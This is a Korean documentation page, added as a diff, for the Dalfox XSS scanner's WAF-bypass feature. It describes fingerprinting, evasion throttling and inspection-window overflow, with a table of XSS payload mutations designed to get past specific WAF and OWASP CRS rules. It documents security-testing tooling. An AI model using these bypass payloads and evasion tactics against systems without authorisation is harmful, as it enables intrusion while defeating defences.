@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <!-- CSP via <meta> because GitHub Pages cannot set response headers, so HSTS /
+       frame-ancestors / X-Content-Type-Options (all header-only) are out of
+       scope here. 'upgrade-insecure-requests' is intentionally omitted: prod is
+       HTTPS-only with no mixed content, and that directive would upgrade every
+       asset to https:// and break `hwaro serve` over http://localhost.
+       Set HWARO_DEV=1 (e.g. `HWARO_DEV=1 hwaro serve -i docs`) to drop the CSP
+       locally so hwaro's inline live-reload script is allowed to run. -->
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; base-uri 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self'; manifest-src 'self'; object-src 'none'; form-action 'self'">
+  
+  <meta name="description" content="WAF를 자동으로 탐지하고 WAF별 회피 전략을 적용합니다.">
+  <meta name="color-scheme" content="dark">
+  <meta name="theme-color" content="#0b0d18">
+  <title>WAF 우회 · Dalfox</title>
+  <meta property="og:title" content="WAF 우회">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://dalfox.hahwul.com/ko/guide/waf-bypass/">
+  <meta property="og:description" content="WAF를 자동으로 탐지하고 WAF별 회피 전략을 적용합니다.">
+  <meta property="og:image" content="https://dalfox.hahwul.com/og-images/ko-guide-waf-bypass.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="WAF 우회">
+  <meta name="twitter:description" content="WAF를 자동으로 탐지하고 WAF별 회피 전략을 적용합니다.">
+  <meta name="twitter:image" content="https://dalfox.hahwul.com/og-images/ko-guide-waf-bypass.png">
+  <link rel="alternate" hreflang="ko" href="https://dalfox.hahwul.com/ko/guide/waf-bypass/">
+<link rel="alternate" hreflang="en" href="https://dalfox.hahwul.com/guide/waf-bypass/">
+  <link rel="canonical" href="https://dalfox.hahwul.com/ko/guide/waf-bypass/">
+  <link rel="alternate" type="application/rss+xml" title="Dalfox" href="https://dalfox.hahwul.com/rss.xml">
+  
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"WAF 우회","url":"https://dalfox.hahwul.com/ko/guide/waf-bypass/","description":"WAF를 자동으로 탐지하고 WAF별 회피 전략을 적용합니다.","image":"https://dalfox.hahwul.com/og-images/ko-guide-waf-bypass.png"}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Dalfox","item":"https://dalfox.hahwul.com/ko/"},{"@type":"ListItem","position":2,"name":"가이드","item":"https://dalfox.hahwul.com/ko/guide/"},{"@type":"ListItem","position":3,"name":"WAF 우회"}]}</script>
+  
+  <link rel="stylesheet" href="https://dalfox.hahwul.com/css/fonts.css">
+  <link rel="stylesheet" href="https://dalfox.hahwul.com/css/style.css">
+  <script src="https://dalfox.hahwul.com/js/sidebar-init.js"></script>
+  <link rel="icon" type="image/png" href="/icons/favicon-96x96.png" sizes="96x96" />
+  <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg" />
+  <link rel="shortcut icon" href="/icons/favicon.ico" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png" />
+  <meta name="apple-mobile-web-app-title" content="Dalfox" />
+  <link rel="manifest" href="/icons/site.webmanifest" />
+  <link rel="stylesheet" href="/assets/css/highlight/github-dark.min.css?v=d1a7e7c5">
+  
+</head>
+<body data-section="guide">
+  <a class="skip-link" href="#main">Skip to content</a>
+  <header class="site-header">
+    <div class="header-inner">
+      <div class="header-left">
+        <button class="hamburger" aria-label="Menu" aria-controls="docs-sidebar" aria-expanded="false">
+          <span></span><span></span><span></span>
+        </button>
+        
+        
+        <a href="https://dalfox.hahwul.com/ko/" class="header-logo">
+          <img src="/images/logo_solo.webp" style="width: 30px;" alt="" aria-hidden="true">
+          <span class="header-logo-text">DALFOX</span>
+        </a>
+        <nav class="header-nav">
+          <a href="https://dalfox.hahwul.com/ko/getting-started/">시작하기</a>
+          <a href="https://dalfox.hahwul.com/ko/guide/">가이드</a>
+          <a href="https://dalfox.hahwul.com/ko/integrations/">연동</a>
+          <a href="https://dalfox.hahwul.com/ko/reference/">레퍼런스</a>
+        </nav>
+      </div>
+      <div class="header-right">
+        <button class="search-trigger" type="button" title="검색">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg>
+          <span>검색</span>
+          <kbd>⌘K</kbd>
+        </button>
+        
+        <div class="lang-switch" role="group" aria-label="언어">
+          <a class="lang-switch-item" href="https://dalfox.hahwul.com/guide/waf-bypass/" hreflang="en">EN</a><span class="lang-switch-item is-active" aria-current="true">KO</span>
+        </div>
+        
+        <a class="header-iconlink" href="https://github.com/hahwul/dalfox" target="_blank" rel="noopener" aria-label="GitHub">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
+        </a>
+      </div>
+    </div>
+  </header>
+  <div class="site-overlay" aria-hidden="true"></div>
+  <div class="docs-layout">
+
+
+
+
+
+
+<aside class="docs-sidebar" id="docs-sidebar">
+  <nav class="sidebar-nav">
+    <div class="sidebar-section">
+      <div class="sidebar-title">
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m5 12 7-7 7 7"/><path d="M12 19V5"/></svg>
+        시작하기
+      </div>
+      <ul class="sidebar-links">
+        <li><a href="https://dalfox.hahwul.com/ko/getting-started/">개요</a></li>
+        <li><a href="https://dalfox.hahwul.com/ko/getting-started/installation/">설치</a></li>
+        <li><a href="https://dalfox.hahwul.com/ko/getting-started/quick-start/">빠른 시작</a></li>
+        <li><a href="https://dalfox.hahwul.com/ko/getting-started/configuration/">설정</a></li>
+        
+      </ul>
+    </div>
+    <div class="sidebar-section">
+      <div class="sidebar-title">
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 19.5v-15A2.5 2.5 0 0 1 6.5 2H20v20H6.5a2.5 2.5 0 0 1 0-5H20"/></svg>
+        가이드
+      </div>
+      <ul class="sidebar-links">
+        <li><a href="https://dalfox.hahwul.com/ko/guide/">개요</a></li>
+        <li><a href="https://dalfox.hahwul.com/ko/guide/scanning-modes/">스캔 모드</a></li>
+        <li><a href="https://dalfox.hahwul.com/ko/guide/parameters/">파라미터와 탐색</a></li>
+        <li><a href="https://dalfox.hahwul.com/ko/guide/payloads/">페이로드와 인코딩</a></li>
+        <li><a href="https://dalfox.hahwul.com/ko/guide/waf-bypass/">WAF 우회</a></li>
+        <li><a href="https://dalfox.hahwul.com/ko/guide/stored-xss/">저장형 XSS</a></li>
+        <li><a href="https://dalfox.hahwul.com/ko/guide/output/">출력과 리포트</a></li>
+        
+      </ul>
+    </div>
+    <div class="sidebar-section">
+      <div class="sidebar-title">
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+        연동
+      </div>
+      <ul class="sidebar-links">
+        <li><a href="https://dalfox.hahwul.com/ko/integrations/">개요</a></li>
+        <li><a href="https://dalfox.hahwul.com/ko/integrations/server/">REST API 서버</a></li>
+        <li><a href="https://dalfox.hahwul.com/ko/integrations/mcp/">MCP 서버</a></li>
+        <li><a href="https://dalfox.hahwul.com/ko/integrations/caido/">Caido 워크플로</a></li>
+        <li><a href="https://dalfox.hahwul.com/ko/integrations/skills/">에이전트 스킬</a></li>
+        
+      </ul>
+    </div>
+    <div class="sidebar-section">
+      <div class="sidebar-title">
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
+        레퍼런스
+      </div>
+      <ul class="sidebar-links">
+        <li><a href="https://dalfox.hahwul.com/ko/reference/">개요</a></li>
+        <li><a href="https://dalfox.hahwul.com/ko/reference/cli/">CLI 레퍼런스</a></li>
+        <li><a href="https://dalfox.hahwul.com/ko/reference/config/">설정 파일</a></li>
+        <li><a href="https://dalfox.hahwul.com/ko/reference/environment/">환경 변수</a></li>
+        <li><a href="https://dalfox.hahwul.com/ko/reference/xssmaze/">XSSMaze 점수</a></li>
+        
+      </ul>
+    </div>
+  </nav>
+  <div class="sidebar-footer">
+    <a class="sidebar-version" href="https://github.com/hahwul/dalfox/releases/tag/v3.1.2" target="_blank" rel="noopener" title="Dalfox v3.1.2 release notes">v3.1.2</a>
+    <button class="sidebar-collapse-btn" id="sidebar-collapse" type="button" aria-controls="docs-sidebar" aria-expanded="true" aria-label="사이드바 접기" title="사이드바 접기">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="18" height="18" x="3" y="3" rx="2"/><path d="M9 3v18"/><path d="m16 15-3-3 3-3"/></svg>
+    </button>
+  </div>
+</aside>
+<button class="sidebar-expand-btn" id="sidebar-expand" type="button" aria-controls="docs-sidebar" aria-expanded="false" aria-label="사이드바 펼치기" title="사이드바 펼치기">
+  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="18" height="18" x="3" y="3" rx="2"/><path d="M9 3v18"/><path d="m14 9 3 3-3 3"/></svg>
+</button>
+    <main class="docs-main" id="main">
+      <div class="docs-content-container">
+        <article class="docs-article">
+          <h1>WAF 우회</h1>
+          <p>대부분의 실제 대상은 WAF 뒤에 있습니다. Dalfox는 WAF를 핑거프린트한 뒤, 회피 전략을 자동으로 선택합니다. 해당 WAF의 규칙에 맞춰 조정된 추가 인코더와 페이로드 변형이 그것입니다.</p>
+<h2 id="동작-방식">동작 방식</h2>
+<ol>
+<li>Dalfox는 대상에 소수의 <strong>핑거프린트 프로브</strong>를 보냅니다.</li>
+<li>알려진 WAF 시그니처가 나타나면(<code>cf-ray</code> 같은 헤더, &quot;Attention required!&quot; 같은 본문 마커, 또는 429/403 형태), Dalfox는 해당 WAF와 그 신뢰도를 기록합니다.</li>
+<li>스캐너는 WAF의 <strong>추가 인코더</strong>를 여러분의 인코더 목록에 병합하고, WAF의 <strong>변형 목록</strong>을 페이로드 생성기에 추가합니다.</li>
+<li>페이로드 변형은 상한이 있습니다(기본 페이로드당 4개 변형). 요청량이 과도해지지 않도록 하기 위함입니다. 이 상한은 WAF가 탐지된 후에만 적용되므로, 추가 노력이 정확히 그것을 필요로 하는 스캔에만 투입됩니다.</li>
+</ol>
+<p>이 모든 것은 기본적으로 켜져 있습니다. 비활성화하거나 방향을 조정하고 싶을 때만 플래그를 건드리면 됩니다.</p>
+<h2 id="지원하는-waf">지원하는 WAF</h2>
+<ul>
+<li>Cloudflare</li>
+<li>AWS WAF</li>
+<li>Akamai</li>
+<li>Imperva / Incapsula</li>
+<li>ModSecurity</li>
+<li>OWASP CRS</li>
+<li>Sucuri</li>
+<li>F5 BIG-IP</li>
+<li>Barracuda</li>
+<li>FortiWeb</li>
+<li>Azure WAF</li>
+<li>Google Cloud Armor</li>
+<li>Fastly</li>
+<li>Wordfence</li>
+</ul>
+<p>인식되지 않는 WAF는 일반 폴백 전략을 발동시킵니다.</p>
+<h2 id="동작-조정하기">동작 조정하기</h2>
+<h3 id="auto-기본값">Auto (기본값)</h3>
+<pre><code class="language-bash hljs">dalfox https://target.app
+# equivalent to:
+dalfox https://target.app --waf-bypass auto
+</code></pre>
+<h3 id="특정-waf-강제-지정">특정 WAF 강제 지정</h3>
+<p>핑거프린팅을 건너뛰고 선택한 WAF의 전략을 직접 적용합니다:</p>
+<pre><code class="language-bash hljs">dalfox https://target.app \
+  --waf-bypass force \
+  --force-waf cloudflare
+</code></pre>
+<p>WAF가 자신의 헤더를 감추거나 CDN 뒤에 있을 때 유용합니다.</p>
+<h3 id="waf-로직-비활성화">WAF 로직 비활성화</h3>
+<pre><code class="language-bash hljs">dalfox https://target.app --waf-bypass off
+</code></pre>
+<p>추가 인코더도, 변형도 없습니다. 여러분이 설정한 페이로드만 사용합니다.</p>
+<h3 id="프로브-건너뛰기">프로브 건너뛰기</h3>
+<pre><code class="language-bash hljs">dalfox https://target.app --skip-waf-probe
+</code></pre>
+<p>헤더 기반 수동 탐지는 여전히 사용하지만, 도발성 요청은 보내지 않습니다. 대상이 불안정하고 프로브에 rate limit을 소모하고 싶지 않을 때 사용하세요.</p>
+<h3 id="회피-스로틀">회피 스로틀</h3>
+<p>WAF가 탐지되면 <code>--waf-evasion</code>은 Dalfox를 무딘 감속 대신 <strong>적응형 타이밍</strong>으로 전환합니다. 요청 간 간격을 무작위화(지터)하여 그 주기를 핑거프린트할 수 없게 만들고, 차단된 응답(403/406/429/503)이 무리 지어 나타날 때마다 쿨다운 정지를 점증시킵니다. WAF별 페이싱 힌트도 탐지 시 자동으로 적용되며, 이 플래그가 없어도 마찬가지입니다.</p>
+<pre><code class="language-bash hljs">dalfox https://target.app --waf-evasion
+</code></pre>
+<p>요청 속도에 대한 확고한 상한 — WAF 탐지와 무관하며 <strong>모든</strong> 워커와 대상에 걸쳐 공유되는 — 을 원한다면 <code>--rate-limit</code>(초당 요청 수)과 결합하세요. <code>--delay</code>는 단일 워커의 간격만 벌리므로, 공유 IP 뒤에서 스캔하거나 전역 임계값을 가진 엣지 WAF를 상대할 때 바로 이 손잡이가 적합합니다:</p>
+<pre><code class="language-bash hljs"># At most 15 requests/second across the whole scan, with adaptive evasion
+dalfox https://target.app --rate-limit 15 --waf-evasion
+</code></pre>
+<p>일시적 실패(5xx, 타임아웃, 연결 리셋)는 <code>--retries</code> / <code>--retry-delay</code>로 재시도할 수 있습니다. HTTP 429는 항상 재시도되며 <code>Retry-After</code>가 반영됩니다.</p>
+<h3 id="약한-핑거프린트-걸러내기">약한 핑거프린트 걸러내기</h3>
+<p>각 핑거프린트는 신뢰도 점수(0.0–1.0)를 가집니다. <code>Request blocked</code>(0.3)나 <code>Server: Google Frontend</code>(0.15) 같은 일반적인 마커는 때때로 무해한 오리진에서 오탐을 냅니다. <code>--waf-min-confidence</code>를 사용해 임계값 미만의 항목을 모두 버리세요:</p>
+<pre><code class="language-bash hljs"># Keep only confident matches (drops 0.3/0.15 noise)
+dalfox https://target.app --waf-min-confidence 0.7
+</code></pre>
+<p>기본값은 <code>0.3</code>입니다(<code>Server: Google Frontend</code> 같은 약하거나 일반적인 매치를 억제합니다). <code>--waf-min-confidence 0.0</code>을 넘기면 모든 매치를 유지하며, 잡음이 많은 수동 탐지가 Dalfox를 잘못된 회피 전략으로 몰고 간다고 의심될 때는 값을 높이세요.</p>
+<h2 id="변형-전술-내부-동작">변형 전술 (내부 동작)</h2>
+<p>WAF마다 각기 다른 수법에 무너집니다. 작은 샘플을 소개합니다:</p>
+<table>
+<thead>
+<tr>
+<th>변형</th>
+<th>예시</th>
+<th>효과적인 대상</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>HTML 주석 분할</strong></td>
+<td><code>&lt;scr&lt;!----&gt;ipt&gt;</code></td>
+<td>시그니처 정규식</td>
+</tr>
+<tr>
+<td><strong>JS 주석 분할</strong></td>
+<td><code>al/**/ert(1)</code></td>
+<td>키워드 필터</td>
+</tr>
+<tr>
+<td><strong>백틱 호출</strong></td>
+<td>`<code> alert</code>1<code> </code>`</td>
+<td><code>alert(</code> 정규식</td>
+</tr>
+<tr>
+<td><strong>생성자 체인</strong></td>
+<td><code>[].constructor.constructor(&#39;alert(1)&#39;)()</code></td>
+<td>강력한 키워드 차단</td>
+</tr>
+<tr>
+<td><strong>유니코드 JS 이스케이프</strong></td>
+<td><code>alert(1)</code></td>
+<td>JS 토큰 필터</td>
+</tr>
+<tr>
+<td><strong>슬래시 구분자</strong></td>
+<td><code>&lt;svg/onload=alert(1)/class=x&gt;</code></td>
+<td>CRS 941160</td>
+</tr>
+<tr>
+<td><strong>SVG animate</strong></td>
+<td><code>&lt;svg&gt;&lt;animate onbegin=alert(1) attributeName=x&gt;</code></td>
+<td>CRS 941110</td>
+</tr>
+<tr>
+<td><strong>HTML 엔티티 괄호</strong></td>
+<td><code>alert&amp;#40;1&amp;#41;</code></td>
+<td>CRS 941370</td>
+</tr>
+<tr>
+<td><strong>이색적인 공백</strong></td>
+<td>폼 피드 / 수직 탭</td>
+<td>CRS 941320</td>
+</tr>
+<tr>
+<td><strong>대소문자 교대</strong></td>
+<td><code>&lt;ScRiPt&gt;</code></td>
+<td>대소문자 구분 규칙</td>
+</tr>
+<tr>
+<td><strong>zwsp 삽입</strong></td>
+<td><code>al​ert(1)</code></td>
+<td>렉서 기반 탐지</td>
+</tr>
+<tr>
+<td><strong>키워드 엔티티 인코딩</strong></td>
+<td><code>onerror=&amp;#97;lert(1)</code></td>
+<td><code>alert</code>/핸들러 키워드 정규식(속성 디코딩됨)</td>
+</tr>
+<tr>
+<td><strong>멀티 슬래시</strong></td>
+<td><code>&lt;img/src=x/onerror=alert(1)&gt;</code></td>
+<td>이후 속성 사이의 <code>\s</code>에 고정된 정규식</td>
+</tr>
+<tr>
+<td><strong>스킴 분리</strong></td>
+<td><code>href=java&amp;#9;script:alert(1)</code></td>
+<td>리터럴 <code>javascript:</code> 스킴 정규식(URL 파서가 TAB을 제거)</td>
+</tr>
+<tr>
+<td><strong>엔티티 스킴</strong></td>
+<td><code>href=&amp;#106;avascript:alert(1)</code></td>
+<td>리터럴 <code>javascript:</code> 스킴 정규식(속성 디코딩됨)</td>
+</tr>
+</tbody>
+</table>
+<p>마지막 네 가지는 HTML 토크나이저가 URL 파서나 이벤트 핸들러 JS 컴파일러가 보기 전에 <strong>속성 값 안의</strong> 문자 참조를 디코딩한다는 점을 악용합니다. 이들은 속성 / 이벤트 핸들러 / <code>javascript:</code>-URL 컨텍스트에서만 발동하며, 엔티티 디코딩이 일어나지 않는 순수 본문 텍스트와 <code>&lt;script&gt;</code>/<code>&lt;style&gt;</code> 페이로드에서는 건너뜁니다.</p>
+<p>이들을 직접 설정하지는 않습니다. WAF별로 자동으로 선택됩니다. 무슨 일이 벌어지는지 확인하려면 <code>--debug</code>로 실행하세요.</p>
+<h2 id="검사-윈도우-오버플로">검사 윈도우 오버플로</h2>
+<p>일부 WAF(예: AWS WAF 스타일 설정)는 파라미터 값의 <strong>첫 N바이트</strong>만 검사합니다. 값의 시작 부분에 있는 벡터는 차단을 유발하지만, 동일한 벡터가 검사 윈도우를 넘어서 밀려나면 손대지 않은 채로 반사됩니다.</p>
+<p>능동 프로빙 중에 파라미터의 특수 문자 프로브가 완전히 차단된 채로 돌아오면, Dalfox는 긴 무해한 필러 접두어 뒤에 그것을 다시 시도합니다. 이제 문자가 반사되면, 값이 크기 제한된 검사 윈도우 뒤에 있다고 결론짓고 해당 파라미터의 모든 페이로드 앞에 그 필러를 자동으로 붙입니다. 그러면 실제 벡터가 항상 윈도우 너머에 도달합니다. 보고되는 PoC URL에는 필러가 포함되므로 그대로 재현됩니다. 이것은 자동이며 설정할 것이 없습니다.</p>
+<h2 id="인코더와-결합하기">인코더와 결합하기</h2>
+<p>여러분의 <code>--encoders</code> 목록과 WAF의 추가 인코더가 병합됩니다. 예를 들면:</p>
+<pre><code class="language-bash hljs">dalfox https://target.app -e url,base64
+# Cloudflare detected → extra encoders: unicode, zwsp
+# Effective: url, base64, unicode, zwsp
+</code></pre>
+<p>중복을 자동으로 제거하고 순서를 보존합니다.</p>
+<h2 id="rate-제한-백오프">Rate 제한 &amp; 백오프</h2>
+<p>Dalfox는 연속된 WAF 차단을 추적하고 영구 차단을 피하기 위해 지수적 슬립으로 자동 백오프합니다. 취약한 대상에 대해서는 <code>--delay</code>(요청당 밀리초)와 더 작은 <code>--workers</code>로 도울 수 있습니다.</p>
+<pre><code class="language-bash hljs">dalfox https://target.app --delay 500 --workers 10
+</code></pre>
+<h2 id="디버깅">디버깅</h2>
+<p>디버그 스트림을 켜서 핑거프린트 판단과 활성 전략을 확인하세요:</p>
+<pre><code class="language-bash hljs">dalfox --debug https://target.app 2&gt;&amp;1 | grep -i waf
+</code></pre>
+<h2 id="다음">다음</h2>
+<ul>
+<li><a href="../stored-xss/">저장형 XSS</a>는 여기서-주입-저기서-검증 패턴을 다루며, 이는 종종 WAF와 상호작용합니다.</li>
+<li><a href="../output/">출력 &amp; 리포트</a>는 탐지 결과를 파이프라인에 통합하는 방법을 다룹니다.</li>
+</ul>
+
+        </article>
+        
+        <aside class="docs-toc">
+          <div class="toc-title">목차</div>
+          <div class="toc-content">
+            <ul><li><a href="#동작-방식">동작 방식</a></li><li><a href="#지원하는-waf">지원하는 WAF</a></li><li><a href="#동작-조정하기">동작 조정하기</a><ul><li><a href="#auto-기본값">Auto (기본값)</a></li><li><a href="#특정-waf-강제-지정">특정 WAF 강제 지정</a></li><li><a href="#waf-로직-비활성화">WAF 로직 비활성화</a></li><li><a href="#프로브-건너뛰기">프로브 건너뛰기</a></li><li><a href="#회피-스로틀">회피 스로틀</a></li><li><a href="#약한-핑거프린트-걸러내기">약한 핑거프린트 걸러내기</a></li></ul></li><li><a href="#변형-전술-내부-동작">변형 전술 (내부 동작)</a></li><li><a href="#검사-윈도우-오버플로">검사 윈도우 오버플로</a></li><li><a href="#인코더와-결합하기">인코더와 결합하기</a></li><li><a href="#rate-제한-백오프">Rate 제한 &amp; 백오프</a></li><li><a href="#디버깅">디버깅</a></li><li><a href="#다음">다음</a></li></ul>
+          </div>
+        </aside>
+        
+      </div>
+
+      
+      
+      
+      
+      
+      
+      
+      
+      <footer class="docs-footer">
+        <span><a href="https://github.com/hahwul/dalfox/edit/main/docs/content/guide/waf-bypass.ko.md" target="_blank" rel="noopener">GitHub에서 이 문서 편집</a></span>
+      </footer>
+      
+    </main>
+  </div>
+  <div class="search-overlay" id="searchOverlay">
+    <div class="search-modal">
+      <div class="search-input-wrap">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg>
+        <input type="text" id="searchInput" placeholder="문서 검색..." aria-label="문서 검색" autocomplete="off">
+        <kbd>ESC</kbd>
+      </div>
+      <div class="search-results" id="searchResults"></div>
+    </div>
+  </div>
+  <footer class="site-footer">
+    <div class="footer-inner">
+      <div class="footer-branding">
+        <span>&copy; 2026 <a href="https://github.com/hahwul">HAHWUL</a></span>
+        <span class="divider" style="color:var(--border-light)">·</span>
+        <span>MIT 라이선스로 배포</span>
+        <span class="divider" style="color:var(--border-light)">·</span>
+        <span><a href="https://hwaro.hahwul.com" target="_blank" rel="noopener">hwaro</a>로 제작</span>
+      </div>
+      <div class="footer-links">
+        <a href="https://github.com/hahwul/dalfox" target="_blank" rel="noopener">GitHub</a>
+        <a href="https://github.com/hahwul/dalfox/releases" target="_blank" rel="noopener">릴리스</a>
+        <a href="https://github.com/hahwul/dalfox/issues" target="_blank" rel="noopener">이슈</a>
+        <a href="https://github.com/hahwul/dalfox/blob/main/CONTRIBUTING.md" target="_blank" rel="noopener">기여하기</a>
+      </div>
+    </div>
+  </footer>
+  <script src="https://dalfox.hahwul.com/assets/js/highlight.min.js"></script>
+  <script src="https://dalfox.hahwul.com/js/search.js"></script>
+  <script src="https://dalfox.hahwul.com/js/toc.js"></script>
+  <script src="https://dalfox.hahwul.com/js/ui.js"></script>
+  
+</body>
+</html>
